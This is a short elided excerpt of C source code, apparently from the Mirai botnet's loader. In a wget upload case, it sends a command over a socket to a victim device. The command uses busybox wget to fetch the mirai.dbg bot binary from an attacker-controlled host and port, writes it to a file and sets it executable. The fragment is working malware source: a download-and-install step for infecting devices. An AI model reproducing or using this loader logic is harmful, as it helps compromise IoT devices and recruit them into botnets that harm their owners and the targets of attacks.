                        ...
                        if (consumed)
                        {
                            ...
                            switch (conn->info.upload_method)
                            {
                                ...
                                case UPLOAD_WGET:
                                    ...
                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/mirai.dbg -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    wrker->srv->wget_host_ip, wrker->srv->wget_host_port);
#ifdef DEBUG
                                    printf("wget\n");
#endif
                                    break;
